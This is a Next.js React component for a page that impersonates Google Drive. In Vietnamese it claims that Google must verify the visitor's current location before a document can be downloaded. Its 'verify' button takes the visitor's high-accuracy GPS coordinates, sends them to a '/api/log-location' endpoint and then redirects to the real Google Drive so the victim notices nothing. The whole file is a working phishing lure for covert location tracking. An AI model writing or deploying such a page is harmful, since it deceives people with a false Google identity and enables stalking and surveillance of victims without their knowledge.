
'use client';

import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';

export function DriveVerificationClient() {
  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
            }),
          }).finally(() => {
            window.location.href = 'https://drive.google.com';
          });
        },
        () => {
          window.location.href = 'https://drive.google.com';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      window.location.href = 'https://drive.google.com';
    }
  };

  return (
    <div className="flex justify-center items-center h-screen">
      <Card className="p-10 rounded-lg shadow-md text-center max-w-md w-[90%]">
        <CardContent className="p-0 flex flex-col items-center">
          <Image
            className="mb-5"
            src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
            alt="Google Drive"
            width={74}
            height={74}
          />
          <h1 className="text-2xl font-medium mb-2.5 text-foreground">Xác minh danh tính</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            Để bảo vệ tệp tin khỏi truy cập trái phép, Google yêu cầu xác minh vị trí hiện tại của bạn trước khi tải xuống tài liệu này.
          </p>
          <Button
            className="px-6"
            onClick={requestLocation}
          >
            Xác minh ngay
          </Button>
          <div className="text-xs text-muted-foreground/80 mt-6">
            Thông tin này giúp ngăn chặn các hoạt động đăng nhập đáng ngờ.
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
